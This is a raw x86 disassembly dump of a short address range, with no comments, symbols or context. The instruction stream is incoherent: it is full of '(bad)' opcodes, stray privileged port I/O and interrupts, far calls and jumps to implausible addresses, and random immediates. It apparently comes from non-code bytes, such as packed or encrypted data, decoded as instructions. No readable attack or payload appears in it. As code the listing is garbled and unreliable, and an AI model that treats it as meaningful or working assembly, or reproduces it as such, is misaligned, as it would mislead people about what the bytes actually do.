  41c96a:	(bad)  
  41c96b:	nop
  41c96c:	xor    esi,DWORD PTR [edi+0x5d]
  41c96f:	outs   dx,DWORD PTR ds:[esi]
  41c970:	add    ch,BYTE PTR [esi-0x1795968d]
  41c976:	jg     0x41c8ff
  41c978:	add    esp,0x1a
  41c97b:	mov    ds:0xc1feb02e,al
  41c980:	arpl   sp,bp
  41c982:	jge    0x41c9e1
  41c984:	mov    dh,BYTE PTR [eax]
  41c986:	dec    ecx
  41c987:	jp     0x41c979
  41c989:	xor    ah,BYTE PTR [eax-0xf096f0f]
  41c98f:	imul   ecx,eax,0x55c70c2e
  41c995:	test   eax,0x3120f07b
  41c99a:	test   esi,0xbd613627
  41c9a0:	(bad)  
  41c9a1:	jns    0x41c9eb
  41c9a3:	xor    BYTE PTR [edi+0x2894d169],0xbd
  41c9aa:	sub    bl,BYTE PTR [edi]
  41c9ac:	push   esi
  41c9ad:	out    dx,eax
  41c9ae:	cmp    DWORD PTR [esi+0x2e65bc06],edx
  41c9b4:	scas   al,BYTE PTR es:[edi]
  41c9b5:	int    0x38
  41c9b7:	rcl    BYTE PTR [ecx+0x25],0xac
  41c9bb:	test   al,0xd3
  41c9bd:	shr    DWORD PTR [esi],0xef
  41c9c0:	mov    dl,BYTE PTR [esi+0x11]
  41c9c3:	adc    ebp,ebp
  41c9c5:	sub    DWORD PTR [edi-0x3d],0xffffff88
  41c9c9:	push   eax
  41c9ca:	test   eax,0xbb12b443
  41c9cf:	dec    esi
  41c9d0:	les    eax,FWORD PTR [ebp-0x485b8f99]
  41c9d6:	scas   al,BYTE PTR es:[edi]
  41c9d7:	retf   
  41c9d8:	test   al,0x6e
  41c9da:	dec    esi
  41c9db:	or     eax,0xbbd54739
  41c9e0:	aam    0x2b
  41c9e2:	imul   ecx,DWORD PTR [ebp+0x1c],0x744be958
  41c9e9:	and    al,ch
  41c9eb:	or     ch,al
  41c9ed:	push   0x8
  41c9ef:	popa   
  41c9f0:	outs   dx,BYTE PTR ds:[esi]
  41c9f1:	aaa    
  41c9f2:	add    eax,DWORD PTR [edx]
  41c9f4:	arpl   WORD PTR [ecx+0x2f10ea80],bx
  41c9fa:	pop    esp
  41c9fb:	out    dx,eax
  41c9fc:	add    al,0xce
  41c9fe:	cld    
  41c9ff:	sub    DWORD PTR [edx-0x4c1d8f25],0x17d5a4a7
  41ca09:	in     al,dx
  41ca0a:	cmp    DWORD PTR [edx],edi
  41ca0c:	jo     0x41ca62
  41ca0e:	mov    esp,0xeb910653
  41ca13:	js     0x41ca3c
  41ca15:	out    dx,al
  41ca16:	add    DWORD PTR [bp-0x395e],edx
  41ca1b:	or     eax,0xcd409435
  41ca20:	ret    
  41ca21:	mov    ebx,DWORD PTR [ebx+0x2d]
  41ca24:	and    al,0xeb
  41ca26:	push   edx
  41ca27:	adc    ecx,edx
  41ca29:	cmp    DWORD PTR [esi],eax
  41ca2b:	es in  eax,dx
  41ca2d:	mov    WORD PTR [esp+eiz*4],fs
  41ca30:	lods   eax,DWORD PTR ds:[esi]
  41ca31:	test   BYTE PTR [edx],bl
  41ca33:	stos   DWORD PTR es:[edi],eax
  41ca34:	push   ebx
  41ca35:	adc    DWORD PTR [ebp+0x17],ecx
  41ca38:	push   ss
  41ca39:	sbb    bh,0x64
  41ca3c:	mov    eax,0xaf0fec04
  41ca41:	sbb    eax,0xa585a988
  41ca46:	repz sbb BYTE PTR [edi-0x24],dl
  41ca4a:	lea    ecx,[ebp+0x6772b9ad]
  41ca50:	mov    esp,0xd4fc06fd
  41ca55:	xchg   DWORD PTR [edx-0x6f18930e],esp
  41ca5b:	sub    DWORD PTR [ebx+0x114a2ab6],esi
  41ca61:	add    al,0x15
  41ca63:	scas   al,BYTE PTR es:[edi]
  41ca64:	push   ecx
  41ca65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca66:	test   BYTE PTR [edi],bl
  41ca68:	sti    
  41ca69:	add    BYTE PTR [edx-0x1b],al
  41ca6c:	data16 xchg al,bh
  41ca6f:	xchg   esi,eax
  41ca70:	pop    es
  41ca71:	mov    edx,0xb7331b32
  41ca76:	push   ss
  41ca77:	add    BYTE PTR [ecx],ch
  41ca79:	sbb    BYTE PTR [ecx+0x65],dl
  41ca7c:	dec    esi
  41ca7d:	test   DWORD PTR [edi+0x74],0x2789bf5
  41ca84:	mov    ebx,0xbb6acb66
  41ca89:	inc    edx
  41ca8a:	mov    ebx,0xc5d291e5
  41ca8f:	sbb    DWORD PTR [ebx+0x65],ebp
  41ca92:	leave  
  41ca93:	mov    dh,0x5
  41ca95:	(bad)  
  41ca96:	fiadd  WORD PTR [ecx-0x35]
  41ca99:	enter  0xcdbf,0xdc
  41ca9d:	push   0x6b9fd011
  41caa2:	outs   dx,DWORD PTR ds:[esi]
  41caa3:	leave  
  41caa4:	icebp  
  41caa5:	jg     0x41cae7
  41caa7:	dec    edi
  41caa8:	jmp    0x4a88034a
  41caad:	adc    eax,0x6f05b105
  41cab2:	mov    edx,0xd4110762
  41cab7:	ins    DWORD PTR es:[edi],dx
  41cab8:	idiv   DWORD PTR [eax+0x2e]
  41cabb:	daa    
  41cabc:	or     bl,ch
  41cabe:	aaa    
  41cabf:	mov    al,ds:0x94a4d4ce
  41cac4:	inc    esp
  41cac5:	out    0x9e,eax
  41cac7:	mov    ebx,0x5277cf6
  41cacc:	(bad)  
  41cacd:	int3   
  41cace:	repnz in al,dx
  41cad0:	retf   
  41cad1:	mov    bl,dl
  41cad3:	(bad)  [ebp-0x4f15e983]
  41cad9:	popa   
  41cada:	mov    esp,0x1c8b7801
  41cadf:	jb     0x41cb2d
  41cae1:	xor    ah,ch
  41cae3:	pop    esi
  41cae4:	push   ss
  41cae5:	dec    edx
  41cae6:	test   DWORD PTR [esp+ebx*1-0x7d],esi
  41caea:	int3   
  41caeb:	mov    ecx,0xbf32538
  41caf0:	inc    eax
  41caf1:	fld    DWORD PTR [eax-0x66]
  41caf4:	clc    
  41caf5:	repnz or BYTE PTR [edx-0x6eb60a32],ch
  41cafc:	loop   0x41ca99
  41cafe:	lock test BYTE PTR [ecx+0x51],ah
  41cb02:	ds or  eax,0xe48816fb
  41cb08:	ret    
  41cb09:	and    dh,BYTE PTR [ecx+0x4956506d]
  41cb0f:	test   BYTE PTR [ecx+esi*8-0x876b8cd],0x71
  41cb17:	fistp  QWORD PTR [ecx+0x4a]
  41cb1a:	retf   0x9078
  41cb1d:	xor    DWORD PTR [edx+0x166e114],eax
  41cb23:	xor    al,0x9d
  41cb25:	add    ch,BYTE PTR [ecx]
  41cb27:	jno    0x41cb8c
  41cb29:	fsubr  DWORD PTR [eax-0x80]
  41cb2c:	mov    edx,0x398b8c30
  41cb31:	sub    eax,0x4de3151d
  41cb36:	imul   esp,DWORD PTR [eax],0x2a159434
  41cb3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb3d:	inc    ecx
  41cb3e:	mov    WORD PTR [eax-0x7f1f0cd4],?
  41cb44:	mov    ch,0xc7
  41cb46:	pushf  
  41cb47:	sbb    edi,edx
  41cb49:	mov    al,ds:0xcfae9a41
  41cb4e:	out    0x1f,eax
  41cb50:	jno    0x41cb96
  41cb52:	aas    
  41cb53:	popf   
  41cb54:	es (bad) 
  41cb56:	xchg   esp,eax
  41cb57:	outs   dx,BYTE PTR ds:[esi]
  41cb58:	jne    0x41cb35
  41cb5a:	cmp    eax,0xbdcf2fa8
  41cb5f:	rcr    esi,cl
  41cb61:	push   es
  41cb62:	mov    edx,0x140fec9f
  41cb67:	out    0xaa,eax
  41cb69:	pop    ebx
  41cb6a:	push   0x16
  41cb6c:	(bad)  
  41cb6d:	aas    
  41cb6e:	sub    bl,BYTE PTR [edx-0x3697d87a]
  41cb74:	(bad)  
  41cb75:	faddp  st(0),st
  41cb77:	sub    dh,0x21
  41cb7a:	adc    dl,BYTE PTR [edi+ecx*8-0x438c6b92]
  41cb81:	pop    es
  41cb82:	push   0x1ca1d7c
  41cb87:	dec    ecx
  41cb88:	xchg   ebx,edx
  41cb8a:	add    bl,BYTE PTR [edx+0x8]
  41cb8d:	cmp    DWORD PTR [eax+edx*8],esp
  41cb90:	add    edi,DWORD PTR [edi+0x5d]
  41cb93:	scas   eax,DWORD PTR es:[edi]
  41cb94:	sub    al,0xce
  41cb96:	xor    esp,edi
  41cb98:	cmp    dh,BYTE PTR ds:0x77635c2e
  41cb9e:	popf   
  41cb9f:	(bad)  
  41cba0:	pop    ebp
  41cba1:	jl     0x41cbb8
  41cba3:	add    ch,bl
  41cba5:	cmp    BYTE PTR [ebx+ecx*2],ah
  41cba8:	cmp    al,0x23
  41cbaa:	sub    eax,0x181e1b01
  41cbaf:	jle    0x41cbf2
  41cbb1:	mov    ecx,0x391c8e76
  41cbb6:	push   esi
  41cbb7:	outs   dx,DWORD PTR ds:[esi]
  41cbb8:	popf   
  41cbb9:	dec    edi
  41cbba:	push   ss
  41cbbb:	xor    dh,BYTE PTR [edx+0x39]
  41cbbe:	dec    esp
  41cbbf:	inc    ecx
  41cbc0:	cdq    
  41cbc1:	sub    eax,0xc22331c
  41cbc6:	out    dx,al
  41cbc7:	sbb    BYTE PTR [edi+0x3c],bh
  41cbca:	push   ds
  41cbcb:	push   0x9a0855dd
  41cbd0:	push   es
  41cbd1:	repnz sbb dl,al
  41cbd4:	dec    edx
  41cbd5:	bound  edi,QWORD PTR [eax-0x37]
  41cbd8:	int3   
  41cbd9:	cmp    BYTE PTR [esi-0xc],dh
  41cbdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cbdd:	test   ch,bh
  41cbdf:	test   BYTE PTR [edx-0x47],dh
  41cbe2:	pop    ebx
  41cbe3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cbe4:	push   esi
  41cbe5:	pop    ebx
  41cbe6:	push   0xca50db7
  41cbeb:	retf   0x15a5
  41cbee:	jmp    0x41cc12
  41cbf0:	fld    QWORD PTR [esi]
  41cbf2:	lds    esp,FWORD PTR ds:0x6fd41349
  41cbf8:	adc    ebx,ebp
  41cbfa:	es das 
  41cbfc:	jg     0x41cb8e
  41cbfe:	loop   0x41cc49
  41cc00:	std    
  41cc01:	mov    ds,eax
  41cc03:	mov    esp,edx
  41cc05:	pop    eax
  41cc06:	cmp    eax,0x618dd512
  41cc0b:	data16 arpl cx,di
  41cc0e:	lods   al,BYTE PTR ds:[esi]
  41cc0f:	xlat   BYTE PTR ds:[ebx]
  41cc10:	xor    DWORD PTR [edx],ecx
  41cc12:	dec    esi
  41cc13:	in     al,dx
  41cc14:	mov    eax,ds:0x36456d4d
  41cc19:	adc    bl,cl
  41cc1b:	push   si
  41cc1d:	sub    al,0x87
  41cc1f:	pusha  
  41cc20:	dec    ebx
  41cc21:	cmp    dh,BYTE PTR [ecx-0x60]
  41cc24:	jecxz  0x41cc15
  41cc26:	mov    ds:0xd639acaf,eax
  41cc2b:	cwde   
  41cc2c:	mov    ecx,0xa294de3f
  41cc31:	adc    ah,dh
  41cc33:	repz test DWORD PTR [ebx+0x29],ecx
  41cc37:	sub    eax,0x951fbbaf
  41cc3c:	adc    dh,BYTE PTR [ecx]
  41cc3e:	or     al,0xfb
  41cc40:	pop    ds
  41cc41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc42:	jbe    0x41cbe1
  41cc44:	jno    0x41cc99
  41cc46:	shl    DWORD PTR [ebx-0x43],cl
  41cc49:	jno    0x41cbdd
  41cc4b:	sub    edx,ebp
  41cc4d:	in     eax,0xa9
  41cc4f:	loope  0x41cc5d
  41cc51:	adc    ah,0x72
  41cc54:	jnp    0x41cc0f
  41cc56:	jno    0x41cc18
  41cc58:	fdivr  QWORD PTR [ecx-0x6d]
  41cc5b:	mov    ecx,?
  41cc5d:	push   eax
  41cc5e:	mov    esi,0x1c3f892
  41cc63:	xor    esi,ecx
  41cc65:	or     al,0xba
  41cc67:	push   edx
  41cc68:	jmp    0x8b613e79
  41cc6d:	fs cld 
  41cc6f:	pop    ebx
  41cc70:	das    
  41cc71:	jp     0x41ccc1
  41cc73:	jne    0x41ccc5
  41cc75:	jno    0x41cc31
  41cc77:	stos   BYTE PTR es:[edi],al
  41cc78:	xor    al,0xf6
  41cc7a:	push   ebx
  41cc7b:	ret    0x8436
  41cc7e:	inc    ebx
  41cc7f:	xor    DWORD PTR [esi-0x41],ebp
  41cc82:	call   0x958d:0xdecce5de
  41cc89:	dec    esi
  41cc8a:	and    ch,BYTE PTR [ebp+0x33]
  41cc8d:	dec    ecx
  41cc8e:	dec    esi
  41cc8f:	add    al,0x1c
  41cc91:	and    eax,0x9d026c7a
  41cc96:	xchg   ebx,eax
  41cc97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc98:	iret   
  41cc99:	and    BYTE PTR [edi+0x60],bh
  41cc9c:	push   0x21
  41cc9e:	push   ds
  41cc9f:	mov    ds:0x5c965ce0,eax
  41cca4:	xor    BYTE PTR [ecx-0x37],bl
  41cca7:	sub    DWORD PTR [esi+0x79],0x25
  41ccab:	push   eax
  41ccac:	(bad)  
  41ccad:	xchg   edi,eax
  41ccae:	fs push cs
  41ccb0:	xchg   ecx,eax
  41ccb1:	sub    eax,0x1b57243b
  41ccb6:	icebp  
  41ccb7:	out    0x73,al
  41ccb9:	pop    edx
  41ccba:	das    
  41ccbb:	(bad)  
  41ccbd:	popf   
  41ccbe:	mov    ds:0x94cd08bc,al
  41ccc3:	leave  
  41ccc4:	mov    edi,0xd71fbe5a
  41ccc9:	push   esp
  41ccca:	mov    esi,0x95ee4438
  41cccf:	loop   0x41ccd3
  41ccd1:	mov    ebp,0xa24b5e30
  41ccd6:	loope  0x41ccb4
  41ccd8:	add    cl,BYTE PTR [esp+esi*2+0x13]
  41ccdc:	sub    esi,DWORD PTR [ebp+0xe]
  41ccdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cce0:	or     bh,BYTE PTR [eax]
  41cce2:	outs   dx,DWORD PTR ds:[esi]
  41cce3:	xacquire xchg DWORD PTR [esi+eiz*4-0x79],edx
  41cce8:	fsubrp st(0),st
  41ccea:	ins    BYTE PTR es:[edi],dx
  41cceb:	xchg   edx,eax
  41ccec:	in     eax,dx
  41cced:	iret   
  41ccee:	je     0x41cccc
  41ccf0:	dec    esp
  41ccf1:	jge    0x41ccb9
  41ccf3:	inc    eax
  41ccf4:	sbb    eax,0xf5f8c1
  41ccf9:	fidivr DWORD PTR [esi-0x76]
  41ccfc:	jns    0x41cd73
  41ccfe:	inc    esi
  41ccff:	outs   dx,DWORD PTR ds:[esi]
  41cd00:	hlt    
  41cd01:	and    DWORD PTR [edi+0x59],0x62b327ff
  41cd08:	inc    esi
  41cd09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd0a:	sbb    cl,dl
  41cd0c:	fs int 0x71
  41cd0f:	mov    bl,0xff
  41cd11:	inc    ebp
  41cd12:	aas    
  41cd13:	add    eax,0xc54e52fe
  41cd18:	nop
  41cd19:	mov    ah,0x3e
  41cd1b:	and    DWORD PTR [edx+0x42],edx
  41cd1e:	dec    ebp
  41cd1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd20:	sbb    cl,bl
  41cd22:	scas   eax,DWORD PTR es:[edi]
  41cd23:	stos   BYTE PTR es:[edi],al
  41cd24:	dec    ebp
  41cd25:	ret    
  41cd26:	jbe    0x41ccf0
  41cd28:	jb     0x41ccbc
  41cd2a:	sbb    DWORD PTR [esi-0x306eb4e0],esi
  41cd30:	shl    edx,0xc
  41cd33:	or     al,0x68
  41cd35:	jo     0x41cd49
  41cd37:	ins    BYTE PTR es:[edi],dx
  41cd38:	hlt    
  41cd39:	sub    eax,0xa3967c8b
  41cd3e:	sbb    al,0x29
  41cd40:	mov    al,ds:0xaf02f861
  41cd45:	icebp  
  41cd46:	jge    0x41ccfa
  41cd48:	hlt    
  41cd49:	pop    ebx
  41cd4a:	jne    0x41cd55
  41cd4c:	push   esp
  41cd4d:	cmp    DWORD PTR [ecx+0x46cdc1dd],esp
  41cd53:	xor    eax,0x7069dd7e
  41cd58:	sbb    al,cl
  41cd5a:	pop    ss
  41cd5b:	scas   al,BYTE PTR es:[edi]
  41cd5c:	and    al,0xbe
  41cd5e:	jle    0x41cd8f
  41cd60:	mov    gs:0x10a0f4ed,eax
  41cd66:	push   edi
  41cd67:	pusha  
  41cd68:	mov    dh,0x19
  41cd6a:	push   eax
  41cd6b:	push   ds
  41cd6c:	int    0xc3
  41cd6e:	adc    dh,al
  41cd70:	and    ebx,DWORD PTR [esp+ebx*4]
  41cd73:	dec    esp
  41cd74:	lds    edx,FWORD PTR [ecx-0x74e682c1]
  41cd7a:	push   ebx
  41cd7b:	fadd   QWORD PTR [eax]
  41cd7d:	jnp    0x41cde8
  41cd7f:	popa   
  41cd80:	pop    ds
  41cd81:	jae    0x41cd4d
  41cd83:	cmp    DWORD PTR [esi],ebp
  41cd85:	jmp    0xab4852e8
  41cd8a:	xchg   edi,eax
  41cd8b:	adc    bl,BYTE PTR es:[edx]
  41cd8e:	sub    BYTE PTR [esi],0x18
  41cd91:	(bad)  
  41cd92:	cmp    bl,ch
  41cd94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd95:	xchg   ecx,eax
  41cd96:	mov    al,ds:0x61a7b8b
  41cd9b:	arpl   WORD PTR [edi+0x29],ax
  41cd9e:	inc    esp
  41cd9f:	sbb    eax,0xdde07da
  41cda4:	cmp    cl,dl
  41cda6:	mov    edx,0x1bfb08f0
  41cdab:	and    al,0x63
  41cdad:	sahf   
  41cdae:	sub    esi,ebx
  41cdb0:	out    dx,al
  41cdb1:	cdq    
  41cdb2:	sahf   
  41cdb3:	pushf  
  41cdb4:	mov    DWORD PTR [ebx-0x52],esp
  41cdb7:	stos   BYTE PTR es:[edi],al
  41cdb8:	stc    
  41cdb9:	(bad)  
  41cdbb:	int3   
  41cdbc:	pushf  
  41cdbd:	and    eax,0xfeb95b72
  41cdc2:	sbb    eax,0x36c70ae2
  41cdc7:	test   BYTE PTR [esi-0x51],dl
  41cdca:	adc    esi,0xa8b2dd71
  41cdd0:	ficomp DWORD PTR [esp+ebx*8]
  41cdd3:	aaa    
  41cdd4:	mov    al,0x6a
  41cdd6:	(bad)  
  41cdd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cdd8:	mov    eax,ds:0x3deeff2a
  41cddd:	not    BYTE PTR [esi-0x6a561a36]
  41cde3:	(bad)  
  41cde4:	mov    ds:0xda84ecc1,al
  41cde9:	je     0x41cddf
  41cdeb:	pop    esi
  41cdec:	xor    BYTE PTR ds:0x89ac46ee,bh
  41cdf2:	or     eax,0x92a194c8
  41cdf7:	xor    al,0xda
  41cdf9:	lea    ebp,[eax-0x7c]
  41cdfc:	push   ss
  41cdfd:	dec    ebx
  41cdfe:	push   eax
  41cdff:	in     eax,0x99
  41ce01:	push   es
  41ce02:	call   0xac80:0xc2b7b328
  41ce09:	push   edx
  41ce0a:	mov    DWORD PTR [ebx+0x15],edx
  41ce0d:	cmp    DWORD PTR [ecx+0x25],0xffffff81
  41ce11:	call   0x7d75:0xe67f7665
  41ce18:	inc    edx
  41ce19:	sar    ebx,0x87
  41ce1c:	shl    BYTE PTR [eax-0x50],1
  41ce1f:	add    BYTE PTR [edx],bl
  41ce21:	xor    eax,0xc1d74f08
  41ce26:	cvtps2pd xmm7,xmm7
  41ce29:	mov    bl,0x27
  41ce2b:	frstor [esp+edx*4]
  41ce2e:	stos   BYTE PTR es:[edi],al
  41ce2f:	dec    esi
  41ce30:	adc    eax,0x709ca850
  41ce35:	loop   0x41cde7
  41ce37:	ja     0x41ce5b
  41ce39:	les    esp,FWORD PTR [ecx+ecx*2]
  41ce3c:	inc    ecx
  41ce3d:	jmp    0x41cebd
  41ce3f:	scas   al,BYTE PTR es:[edi]
  41ce40:	jp     0x41ce8f
  41ce42:	or     eax,0x3072d13b
  41ce47:	pop    edx
  41ce48:	sbb    cl,0x8b
  41ce4b:	push   ss
  41ce4c:	(bad)  
  41ce4d:	ds dec esi
  41ce4f:	cli    
  41ce50:	dec    si
  41ce52:	fcom   QWORD PTR [esi+edx*2-0x3]
  41ce56:	fiadd  WORD PTR [edx+0x4fab5ce4]
  41ce5c:	xchg   ebp,eax
  41ce5d:	fisttp WORD PTR [ebx-0x3a]
  41ce60:	into   
  41ce61:	lock push 0x305e42c0
  41ce67:	or     BYTE PTR [ecx-0x56],ah
  41ce6a:	push   eax
  41ce6b:	jge    0x41cecc
  41ce6d:	xor    BYTE PTR ds:[bp+di],dh
  41ce71:	rcr    BYTE PTR [edi+0xa],1
  41ce74:	(bad)
  41ce77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce78:	cmp    eax,0xba2ac677
  41ce7d:	aad    0xde
  41ce7f:	push   0x7b
  41ce81:	mov    ch,0xeb
  41ce83:	fcom   DWORD PTR [eax+0x13]
  41ce86:	gs into 
  41ce88:	sti    
  41ce89:	pusha  
  41ce8a:	ret    
  41ce8b:	out    0xb1,eax
  41ce8d:	ret    0x1027
  41ce90:	adc    DWORD PTR [eax-0x159eeb10],eax
  41ce96:	xchg   edx,eax
  41ce97:	rep outs dx,DWORD PTR ds:[esi]
  41ce99:	sub    al,0xa4
  41ce9b:	pop    ds
  41ce9c:	sahf   
  41ce9d:	mov    esi,0x80685f0
  41cea2:	inc    ecx
  41cea3:	rol    DWORD PTR [edx],0x97
  41cea6:	adc    ebp,DWORD PTR [edx+0x11]
  41cea9:	mov    dh,0x3a
  41ceab:	pushw  cs
  41cead:	out    0x8a,al
  41ceaf:	and    ah,BYTE PTR [ebx]
  41ceb1:	jl     0x41ce84
  41ceb3:	popa   
  41ceb4:	loop   0x41ce4e
  41ceb6:	mov    ch,0x79
  41ceb8:	inc    esp
  41ceb9:	pop    ebx
  41ceba:	in     al,dx
  41cebb:	test   BYTE PTR [ecx],bh
  41cebd:	xchg   ebp,eax
  41cebe:	push   0xdceaa29f
  41cec3:	push   esi
  41cec4:	ja     0x41cea2
  41cec6:	push   ebp
  41cec7:	jne    0x41ceb5
  41cec9:	jmp    0x41cee0
  41cecb:	adc    al,BYTE PTR [edi+0x1f]
  41cece:	and    ah,BYTE PTR [eax+0x49461b5e]
  41ced4:	jb     0x41cecb
  41ced6:	push   0xfdc61e78
  41cedb:	jge    0x41cedc
  41cedd:	mov    cl,0xfb
  41cedf:	fnstcw WORD PTR [edx+0x57]
  41cee2:	popa   
  41cee3:	cmc    
  41cee4:	rol    DWORD PTR [edx+0x25],cl
  41cee7:	js     0x41cead
  41cee9:	js     0x41ce80
  41ceeb:	mov    dh,0xd3
  41ceed:	adc    eax,0xeee5733e
  41cef2:	ins    DWORD PTR es:[edi],dx
  41cef3:	jle    0x41ce87
  41cef5:	mov    eax,ds:0xc7a42e86
  41cefa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cefb:	pop    edx
  41cefc:	xchg   ebx,eax
  41cefd:	lock fdiv DWORD PTR [ecx+esi*8-0x3a]
  41cf02:	loope  0x41cf74
  41cf04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf05:	outs   dx,BYTE PTR ds:[esi]
  41cf06:	stos   BYTE PTR es:[edi],al
  41cf07:	cmc    
  41cf08:	cmp    BYTE PTR [ebp+0x3e],dl
  41cf0b:	jmp    DWORD PTR [edi]
  41cf0d:	ds dec ebx
  41cf0f:	dec    edx
  41cf10:	mov    ebp,0x812a33b4
  41cf15:	stos   BYTE PTR es:[edi],al
  41cf16:	in     eax,dx
  41cf17:	cs std 
  41cf19:	cmp    dl,bh
  41cf1b:	xor    bl,bl
  41cf1d:	fnstsw WORD PTR [esi-0x7b]
  41cf20:	cmp    BYTE PTR [ecx+0x3290946e],dl
  41cf26:	icebp  
  41cf27:	div    BYTE PTR [eax-0x38024fe0]
  41cf2d:	inc    ebp
  41cf2e:	cli    
  41cf2f:	pop    ebp
  41cf30:	add    dl,ah
  41cf32:	or     al,0x12
  41cf34:	jmp    0x41ced1
  41cf36:	mov    ecx,0x94b5510e
  41cf3b:	out    dx,eax
  41cf3c:	sbb    bl,BYTE PTR [esi]
  41cf3e:	mov    es,edi
  41cf40:	add    BYTE PTR [edi-0x5f],bl
  41cf43:	jne    0x41cec8
  41cf45:	xor    eax,0xebde5c6f
  41cf4a:	xchg   edi,eax
  41cf4b:	dec    ebp
  41cf4c:	pop    ebx
  41cf4d:	out    dx,al
  41cf4e:	push   cs
  41cf4f:	dec    ebp
  41cf50:	mov    ds:0xccb417ed,eax
  41cf55:	mov    ebx,0x2f13cd0c
  41cf5a:	jb     0x41cf10
  41cf5c:	inc    eax
  41cf5d:	pusha  
  41cf5e:	xor    ebx,edx
  41cf60:	daa    
  41cf61:	push   ebx
  41cf62:	sbb    BYTE PTR [edx+0x6d2ee6e5],0xa2
  41cf69:	jmp    0xfdbb165d
  41cf6e:	or     edx,ebp
  41cf70:	mov    eax,ds:0xd45e6de
  41cf75:	xor    edx,DWORD PTR [ebx]
  41cf77:	xchg   ah,bl
  41cf79:	inc    edi
  41cf7a:	sub    bh,BYTE PTR ds:0xa6ddd62d
  41cf81:	arpl   WORD PTR [eax],si
  41cf83:	iret   
  41cf84:	sbb    DWORD PTR [edi-0xc],esi
  41cf87:	jmp    0xdf270276
  41cf8c:	fild   DWORD PTR [eax+0x25]
  41cf8f:	out    dx,eax
  41cf90:	sbb    eax,0x5cab3dfd
  41cf95:	sbb    ch,ah
  41cf97:	mov    eax,0x78ecdeba
  41cf9c:	mov    al,BYTE PTR [edx-0x6c474c1]
  41cfa2:	adc    eax,0xc0fe16e
  41cfa7:	dec    ebp
  41cfa8:	popa   
  41cfa9:	jle    0x41cfe7
  41cfab:	mov    dh,BYTE PTR [esi]
  41cfad:	lahf   
  41cfae:	xor    DWORD PTR [ecx+0x7e],esp
  41cfb1:	rol    dl,0x62
  41cfb4:	and    BYTE PTR [esi+0x49a4c828],al
  41cfba:	mov    dl,0xa7
  41cfbc:	mov    ah,0x9c
  41cfbe:	out    dx,al
  41cfbf:	push   ds
  41cfc0:	and    dl,BYTE PTR [esi]
  41cfc2:	loopne 0x41d028
  41cfc4:	(bad)  
  41cfc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cfc7:	pop    ds
  41cfc8:	inc    eax
  41cfc9:	add    eax,0x51d8f05a
  41cfce:	xchg   esp,eax
  41cfcf:	dec    esp
  41cfd0:	mov    cl,0xf3
  41cfd2:	dec    edx
  41cfd3:	popa   
  41cfd4:	sbb    al,0xfa
  41cfd6:	or     cl,BYTE PTR [eax+0x71]
  41cfd9:	push   cs
  41cfda:	fsubr  st,st(1)
  41cfdc:	mov    esi,0xa0c05d72
  41cfe1:	mov    eax,0x58c78566
  41cfe6:	xchg   edi,eax
  41cfe7:	mov    ebp,DWORD PTR [edx-0x69eb32fe]
  41cfed:	shr    DWORD PTR [ebx+0x287f7fd8],cl
  41cff3:	ja     0x41cf79
  41cff5:	dec    edx
  41cff6:	outs   dx,BYTE PTR ds:[esi]
  41cff7:	jbe    0x41d06c
  41cff9:	add    edx,ebp
  41cffb:	push   esp
  41cffc:	aad    0x8c
  41cffe:	nop
  41cfff:	lea    ebx,[eax-0x3727630c]
  41d005:	sbb    ebx,DWORD PTR [ebp-0x78275bb9]
  41d00b:	test   DWORD PTR [ebx],0xfa322387
  41d011:	scas   al,BYTE PTR es:[edi]
  41d012:	imul   ecx,eax,0x3b
  41d015:	pop    edx
  41d016:	inc    esi
  41d017:	gs iretw 
  41d01a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d01b:	dec    edi
  41d01c:	fwait
  41d01d:	scas   eax,DWORD PTR es:[edi]
  41d01e:	mov    bh,0xc7
  41d020:	push   eax
  41d021:	sub    edx,DWORD PTR [eax+0x58]
  41d024:	inc    esi
  41d025:	dec    esi
  41d026:	stos   DWORD PTR es:[edi],eax
  41d027:	adc    DWORD PTR [esi],edx
  41d029:	mov    gs,WORD PTR [ebp+0x115d2bff]
  41d02f:	jb     0x41d041
  41d031:	sub    bl,BYTE PTR [ecx]
  41d033:	(bad)  
  41d034:	outs   dx,DWORD PTR ds:[esi]
  41d035:	adc    edx,ebx
  41d037:	xchg   ebx,eax
  41d038:	or     DWORD PTR [esi+0x54f46f4b],edi
  41d03e:	scas   eax,DWORD PTR es:[edi]
  41d03f:	lea    eax,[esi-0x35607d0a]
  41d045:	mov    ds,WORD PTR [edi+0x35f88592]
  41d04b:	push   ebp
  41d04c:	sahf   
  41d04d:	xor    ch,ah
  41d04f:	adc    DWORD PTR [esi-0x6f],0x9a962d65
  41d056:	or     eax,0x142cace2
  41d05b:	pop    ss
  41d05c:	cwde   
  41d05d:	nop
  41d05e:	sub    DWORD PTR [ebx+0x3c],esi
  41d061:	mov    ch,0x7c
  41d063:	neg    BYTE PTR [edi+0x1c]
  41d066:	or     esp,ebp
  41d068:	test   al,0xe4
  41d06a:	pop    edi
  41d06b:	ja     0x41d0e7
  41d06d:	psrlw  mm4,mm6
  41d070:	mov    dh,0x41
  41d072:	es mov ebx,0x7a532c54
  41d078:	xchg   ebx,eax
  41d079:	pop    ebx
  41d07a:	or     eax,0x7ebfb039
  41d07f:	mov    bh,0x58
  41d081:	je     0x41d03b
  41d083:	cmc    
  41d084:	sub    BYTE PTR [edx+0x584bd21f],bh
  41d08a:	(bad)  
  41d08b:	cmc    
  41d08c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d08d:	jb     0x41d0fc
  41d08f:	test   BYTE PTR [esi-0x1b18f526],cl
  41d095:	sahf   
  41d096:	mov    eax,0x2fb942b6
